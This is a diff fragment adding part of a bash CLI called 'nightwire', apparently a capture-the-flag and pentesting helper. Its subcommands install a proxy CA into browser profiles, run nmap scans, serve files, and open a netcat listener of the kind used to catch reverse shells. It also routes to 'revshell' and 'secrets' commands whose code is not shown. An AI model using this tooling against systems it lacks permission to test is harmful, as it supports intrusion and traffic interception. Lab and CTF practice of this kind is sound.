+    certutil -A -n "CTF Proxy CA" -t "CT,," -i "$cert" -d "sql:$profile" || true
+  done
+}
+
+cmd_browser_import() {
+  local source_file="${1:-}"
+  local profile_name="${2:-nightwire-proxy}"
+  [[ -f "$source_file" ]] || die "usage: nightwire browser-import FILE [PROFILE]"
+  local profile_dir="$HOME/.mozilla/firefox/${profile_name}"
+  mkdir -p "$profile_dir/imports"
+  cp "$source_file" "$profile_dir/imports/"
+  printf 'Imported %s into %s/imports\n' "$source_file" "$profile_dir"
+}
+
+cmd_wordlists() {
+  local pattern="${1:-}"
+  local roots=(/usr/share/seclists /usr/share/wordlists "$HOME/wordlists")
+  local root
+  for root in "${roots[@]}"; do
+    [[ -d "$root" ]] || continue
+    if [[ -n "$pattern" ]]; then
+      find "$root" -iname "*$pattern*" -type f 2>/dev/null | head -100
+    else
+      printf '%s\n' "$root"
+    fi
+  done
+}
+
+cmd_scan() {
+  local target="${1:-}"
+  [[ -n "$target" ]] || die "usage: nightwire scan TARGET"
+  need nmap
+  printf 'Authorized-use reminder: scan only CTF, lab, owned, or explicitly permitted targets.\n'
+  nmap -sC -sV -oA "scan-${target//[^A-Za-z0-9_.-]/_}" "$target"
+}
+
+cmd_serve() {
+  local port="${1:-8000}"
+  python3 -m http.server "$port"
+}
+
+cmd_listen() {
+  local port="${1:-}"
+  [[ -n "$port" ]] || die "usage: nightwire listen PORT"
+  if command -v rlwrap >/dev/null 2>&1; then
+    rlwrap -cAr nc -lvnp "$port"
+  else
+    nc -lvnp "$port"
+  fi
+}
+
+main() {
+  local command="${1:-}"
+  shift || true
+  case "$command" in
+    doctor) cmd_doctor "$@" ;;
+    update) cmd_update "$@" ;;
+    reconfigure) cmd_reconfigure "$@" ;;
+    new) cmd_new "$@" ;;
+    vpn) cmd_vpn "$@" ;;
+    target) cmd_target "$@" ;;
+    ip) cmd_ip "$@" ;;
+    banner) cmd_banner "$@" ;;
+    enum) cmd_enum "$@" ;;
+    web) cmd_web "$@" ;;
+    revshell) cmd_revshell "$@" ;;
+    _ip) iface_ip "$@" ;;
+    _target-ip) target_ip "$@" ;;
+    _tmux-status) cmd_tmux_status "$@" ;;
+    paths) cmd_paths "$@" ;;
+    uninstall) cmd_uninstall "$@" ;;
+    secrets) cmd_secrets "$@" ;;
+    report) cmd_report "$@" ;;
+    cache) cmd_cache "$@" ;;
+    snapshot-note) cmd_snapshot_note "$@" ;;
+    pwn-debuggers) cmd_pwn_debuggers "$@" ;;
+    labs) cmd_labs "$@" ;;
+    browser-proxy) cmd_browser_proxy "$@" ;;
+    browser-ca) cmd_browser_ca "$@" ;;
+    browser-import) cmd_browser_import "$@" ;;
+    wordlists) cmd_wordlists "$@" ;;
+    scan) cmd_scan "$@" ;;
+    serve) cmd_serve "$@" ;;
+    listen) cmd_listen "$@" ;;
+    -h | --help | help | "") usage ;;
+    *) die "unknown command: $command" ;;
+  esac
+}
+
+main "$@"
